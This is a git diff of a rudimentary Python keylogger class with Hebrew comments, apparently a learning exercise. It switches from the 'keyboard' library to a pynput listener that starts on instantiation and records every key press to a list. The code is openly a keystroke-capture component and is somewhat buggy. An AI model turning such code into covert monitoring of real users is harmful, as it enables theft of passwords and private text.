@@ -1,42 +1,38 @@
-import keyboard,datetime
-# מחלקה שמאזינה להקלדות המקלדת בזמן אמת
+from pynput import keyboard
 
 
-
+# מחלקה שמאזינה בזמן אמת למקלדת
 class KeyLoggerService:
-    # אתחול
+    # אתחול של מערכת שבאופן אוטומטי מתחילה האזנה
     def __init__(self):
-       self.keylog = ""
-       self.data_list=[]
+        self.keylog_list = []
+        self.listener = None
+        self.is_listening = False
+        self.start_logging()
 
-    def get_time(self):
-        x = datetime.datetime.now()
-        return  x.strftime("%Y-%m-%d %H:%M:%S")
+    # התחלת האזנה
+    def start_logging(self):
+        self.is_listening = True
+        with keyboard.Listener(
+                on_press=self.log_key_event) as self.listener:
+            self.listener.join()
 
-# התחלת האזנה
-    def start_listening(self):
-        keyboard.hook(self.log_key_event)
-        keyboard.wait("esc")
+    # הפסקת האזנה והחזרת רשימה
+    def stop_logging(self):
+        self.is_listening = False
+        return self.keylog_list
 
-# סיום האזנה
-    def stop_listening(self):
-        keyboard.unhook_all()
+    # הוספת אירוע לרשימה
+    def log_key_event(self, key):
+        if self.is_listening:
+            self.keylog_list.append(key)
 
-
-
-    # האזנה למקלדת
-    def log_key_event(self, event):
-            if event.event_type == keyboard.KEY_DOWN:
-                self.keylog = event.name
-                self.data_list.append([self.keylog])
-
-    def show_log(self):
-        for time, log in self.data_dict.items():
-            print(f"[{time}] {log}")
-
+    # סגירת התוכנית
+    def exit_program(self):
+        self.listener.stop()
+        exit()
 
 
-
-
+a = KeyLoggerService()
 
 
